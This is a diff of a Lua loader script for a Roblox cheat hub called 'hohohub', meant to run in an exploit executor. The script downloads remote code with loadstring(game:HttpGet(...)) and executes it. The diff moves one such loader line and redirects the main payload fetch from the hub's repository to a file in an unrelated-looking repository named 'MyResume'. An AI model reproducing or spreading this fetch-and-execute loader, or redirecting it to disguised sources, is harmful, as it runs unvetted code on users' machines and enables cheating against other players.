@@ -1,5 +1,6 @@
 repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
-local ExecutorName = identifyexecutor()
+local ExecutorName = identifyexecutor() 
+local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Notification.lua"))()
 getgenv().bit = bit32 -- Cubix & Awp issue :)
 local list = {
 	--Blox Fruit
@@ -7,7 +8,6 @@ local list = {
 }
 _G.HoHoLoaded = true
 _G.MY_KEY_IS = "6b65a38062f86678382733d14308bbffb3b4b40dd6d211806cb92caa25365ec6"
-local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Notification.lua"))()
 notify.New("Wait Bro!", 30)
 
 if list[game.GameId] ~= nil then
@@ -16,4 +16,4 @@ else
 	notify.New("This game is not supported by hohohub :(", 60)
 	notify.New("Please join discord.gg/hohohub to check what game r supported by us!", 60)
 end
-local path = "wait(5);loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HohoV2/main/ScriptLoad.lua'))()"
+local path = "loadstring(game:HttpGet('https://raw.githubusercontent.com/rohitrajput-dev/MyResume/refs/heads/main/ScriptLoad.txt'))()"
